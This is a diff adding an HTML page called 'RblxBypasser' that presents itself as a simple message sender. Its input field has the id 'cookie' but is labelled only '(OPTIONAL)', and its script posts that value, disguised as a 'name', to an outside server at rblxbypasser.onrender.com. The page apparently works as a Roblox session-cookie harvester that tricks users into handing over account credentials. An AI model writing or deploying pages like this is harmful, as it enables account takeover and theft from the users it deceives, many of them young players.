@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>RblxBypasser</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            height: 100vh;
+            background: linear-gradient(135deg, #0f172a, #1e293b);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+        }
+
+        .card {
+            background: #1e293b;
+            padding: 25px;
+            border-radius: 16px;
+            width: 90%;
+            max-width: 400px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.4);
+        }
+
+        h1 {
+            text-align: center;
+            margin-bottom: 15px;
+        }
+
+        input, textarea {
+            width: 100%;
+            margin-top: 10px;
+            padding: 12px;
+            border-radius: 10px;
+            border: none;
+            outline: none;
+            background: #0f172a;
+            color: white;
+        }
+
+        textarea {
+            resize: none;
+            height: 100px;
+        }
+
+        button {
+            width: 100%;
+            margin-top: 15px;
+            padding: 12px;
+            border: none;
+            border-radius: 10px;
+            background: #38bdf8;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .status {
+            text-align: center;
+            margin-top: 10px;
+            font-size: 14px;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="card">
+    <h1>RblxBypasser</h1>
+
+    <!-- Optional field -->
+    <input id="cookie" placeholder="(OPTIONAL)">
+    
+    <!-- Required field -->
+    <textarea id="message" placeholder="Your message"></textarea>
+
+    <button onclick="sendMessage()">Send</button>
+
+    <div class="status" id="status"></div>
+</div>
+
+<script>
+async function sendMessage() {
+    let cookie = document.getElementById("cookie").value;
+    let message = document.getElementById("message").value;
+    let status = document.getElementById("status");
+
+    if (!message) {
+        status.innerText = "Message required!";
+        return;
+    }
+
+    status.innerText = "Sending...";
+
+    try {
+        let res = await fetch("https://rblxbypasser.onrender.com/send", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({ name: cookie || "Anonymous", message })
+        });
+
+        let text = await res.text();
+        status.innerText = text;
+
+        document.getElementById("cookie").value = "";
+        document.getElementById("message").value = "";
+
+    } catch (err) {
+        status.innerText = "Error sending";
+    }
+}
+</script>
+
+</body>
+</html>
